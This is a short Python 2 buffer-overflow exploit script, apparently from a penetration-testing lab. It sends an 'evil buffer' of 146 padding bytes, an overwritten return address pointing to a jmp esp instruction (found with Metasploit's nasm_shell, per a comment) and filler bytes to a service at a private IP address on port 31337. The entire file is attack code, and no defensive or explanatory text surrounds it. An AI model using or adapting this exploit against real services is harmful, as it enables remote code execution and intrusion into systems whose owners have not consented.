import socket

# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

#nasm > jmp esp
#    00000000 FFE4 jmp esp

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = b'A' * 146 + b"\xC3\x14\x04\x08" + b'C' * 200
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.45.153', 31337))
    s.send(buffer + '\r\n\r\n')
    print s.recv(1024)
    print "\nDone!."
except:
    print "Could not connect"